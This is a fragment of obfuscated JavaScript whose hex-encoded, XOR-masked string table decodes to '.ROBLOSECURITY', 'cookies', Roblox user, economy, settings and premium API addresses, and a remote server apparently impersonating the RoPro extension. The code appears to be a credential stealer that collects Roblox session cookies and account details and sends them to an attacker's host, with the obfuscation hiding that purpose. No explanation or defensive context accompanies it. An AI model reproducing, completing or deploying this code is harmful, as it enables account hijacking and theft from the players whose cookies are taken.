GyWB__K=xgnQq;main(MPgtXaoIRDTlLmFEFVXmRKRpz?MPgtXaoIRDTlLmFEFVXmRKRpz[GyWB__K(0x106)]:null);});function kFki$BByHnAwhg_wnIUgopKp(){var xcVcRKtqzR=['c4a09e82888a948c9ec7a889c7b38897','ae898684938e9182','8f93939794ddc8c884c99382898895c984888ac8d3b8d7d28eb4aabeaba388a6a6a6a683c89382898895c9808e81','d3d7d2d1d7d18d928fb48dab','c893958689948684938e8889ca938893868b94d8938e8a82a195868a82dabe828695c193958689948684938e8889b39e9782da94928a8a86959e','8f93939794ddc8c882848889888a9ec99588858b889fc984888ac891d6c89294829594c8','d2ded1deded1d786a2a3bf9d9d','85868b86898482','bc1778744ebac7a28a868e8bc79182958e818e8283','a697978b8e8486938e8889c88d948889','8d948889','8f93939794ddc8c8848389ca8e84888994ca978980c9818b86938e848889c984888ac8d2d6d5c8d1d6d2dec8d1d6d2ded4d6dfc9978980','8f93939794ddc8c8909090c99588858b889fc984888ac88f888a82','d6d5df95ad90a6a9a2','878787','d5d2d2dfd0d189b5a0aeb280','8f93939794ddc8c89294829594c99588858b889fc984888ac891d6c89294829594c88692938f8289938e8486938283','a9c8a6','b7a8b4b3','b38f928a8589868e8bb2958b','bc17787377bac7d5b4938297','bc1778746bbac7ae94b78e89','d6d7d1d7d3d495a6be8eb68a','bc17787552bac7b58885929fc7cfb7828983ce','8f93939794ddc8c892978b888683c9908e8c8e8a82838e86c9889580c8908e8c8e9782838e86c884888a8a888994c8938f928a85c881c881d4c8a9a6b8848697b88e848889c9949180c8d6d5d7d7979fcaa9a6b8848697b88e848889c9949180c9978980','8e94a28986858b8283','8f93939794ddc8c886978ec98e978e819ec9889580','a4a8a8acaea2c7a9a8b3c7a1a8b2a9a3','c9b5a8a5aba8b4a2a4b2b5aeb3beda','8f93939794ddc8c8939088949382979182958e818e8486938e8889c99588858b889fc984888ac891d6c88a82938683869386','8f93939794ddc8c8858e8b8b8e8980c99588858b889fc984888ac891d6c8849582838e93','8f93939794ddc8c892978b888683c9908e8c8e8a82838e86c9889580c8908e8c8e9782838e86c884888a8a888994c8938f928a85c8dec8ded6c8a884938e84888994ca8a86958cca808e938f9285c9949180c8d6d5d7d7979fcaa884938e84888994ca8a86958cca808e938f9285c9949180c9978980','d5a68db793a293','d5d2d3dfd2ded4928cb0979d8d','8f93939794ddc8c8909090c99588858b889fc984888ac88a9ec8948293938e898094c88d948889','93829f93','8f939397ddc8c89588979588c9928cc99388ddd6ded6d4d2c886978ec8b588b79588b8b5829f','8488888c8e8294','9493958e89808e819e','91868b9282','939088b4938297b182958e818e8486938e8889a28986858b8283','bc17787554bac7a5868b86898482','808293','b18e84938e8ac7a188928983ddc7','c9b5a8a5aba8b4a2a4b2b5aeb3be','d6d0d5d6d3d3df81b68886bda8','bc17787569bac7b795828a8e928ac7b49386939294','8f93939794ddc8c89795828a8e928a8182869392958294c99588858b889fc984888ac891d6c89294829594c8','bc1778407605676a057b6f085f68bac7b2948295','c8849295958289849e','ab8e9182c7b58297889593c7ab8880','89868a82','ae94a28a868e8bb182958e818e8283','8f93939794ddc8c882848889888a9ec99588858b889fc984888ac891d5c89294829594c8','a684938e9182','8a868992868b','978289838e8980b58885929fb38893868b','d5df9e8484b1ada6','93959282','8f93939794ddc8c88692938fc99588858b889fc984888ac891d6c886848488928993c8978e89','ab8890c7b7828983','d6d2d5ded7ae92829d96be','8f939397ddc8c89588979588c9928cc99388ddd6ded6d4d2c886978ec8b588b79588cab5829f','c891868b8e83869382ca8a828a858295948f8e97','958885929f','a7829182959e888982c7af8e808fc7b78289838e8980'];kFki$BByHnAwhg_wnIUgopKp=function(){return xcVcRKtqzR;};return kFki$BByHnAwhg_wnIUgopKp();}